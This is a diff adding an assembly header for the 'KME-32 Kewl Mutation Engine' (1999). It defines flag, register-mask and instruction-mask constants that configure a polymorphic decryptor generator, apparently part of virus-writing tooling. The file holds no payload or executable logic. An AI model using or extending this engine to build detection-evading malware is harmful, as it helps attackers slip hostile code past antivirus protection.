@@ -1,0 +1,60 @@
+
+; ===========================================================================
+; KME-32  v1.01  Kewl Mutation Engine  (c) 1999 Z0MBiE, http://z0mbie.cjb.net
+; ===========================================================================
+
+; flags
+
+FLAG_DEBUG              equ     00000001h       ; insert INT3 into poly decr
+FLAG_NOLOGIC            equ     00000002h       ; disable "logic"
+FLAG_NOJMPS             equ     00000004h       ; disable JMPs
+FLAG_EIP0               equ     00000008h       ; initial entry = 0, not rnd
+FLAG_NOSHORT            equ     00000010h       ; disable EAX short-opcodes
+
+; registers
+
+REG_EAX                 equ     00000001h       ; bitfields for register mask
+REG_ECX                 equ     00000002h       ;
+REG_EDX                 equ     00000004h       ; at least 1 register should
+REG_EBX                 equ     00000008h       ; be specified
+REG_ESP                 equ     00000010h       ; use EAX otherwise
+REG_EBP                 equ     00000020h       ;
+REG_ESI                 equ     00000040h       ;
+REG_EDI                 equ     00000080h       ;
+REG_ALL                 equ     (not REG_ESP) and 255
+
+; "logic"
+
+CMD_MOV                 equ     00000001h       ; bitfields for command mask
+CMD_XCHG                equ     00000002h       ;
+CMD_ADD                 equ     00000004h       ; at least 1 command should
+CMD_SUB                 equ     00000008h       ; be specified
+CMD_XOR                 equ     00000010h       ;
+CMD_INC                 equ     00000020h       ; all CMD_xxx commands can be
+CMD_DEC                 equ     00000040h       ; disabled by FLAG_NOLOGIC
+CMD_OR                  equ     00000080h       ;
+CMD_AND                 equ     00000100h       ;
+CMD_SHL                 equ     00000200h       ;
+CMD_SHR                 equ     00000400h       ;
+CMD_ROL                 equ     00000800h       ;
+CMD_ROR                 equ     00001000h       ;
+CMD_SAR                 equ     00002000h       ;
+CMD_NOT                 equ     00004000h       ;
+CMD_NEG                 equ     00008000h       ;
+CMD_IMUL                equ     00010000h       ;
+CMD_SHLD                equ     00020000h       ;
+CMD_SHRD                equ     00040000h       ;
+CMD_BTC                 equ     00080000h       ;
+CMD_BTR                 equ     00100000h       ;
+CMD_BTS                 equ     00200000h       ;
+CMD_BSWAP               equ     00400000h       ;
+CMD_XADD                equ     00800000h       ;
+
+; other commands
+
+CMD2_XOR                equ     80000000h       ; one of these 3 commands
+CMD2_ADD                equ     40000000h       ; should be enabled,
+CMD2_SUB                equ     20000000h       ; use CMD2_XOR otherwise
+
+CMD_ALL                 equ     -1              ; use all available commands
+
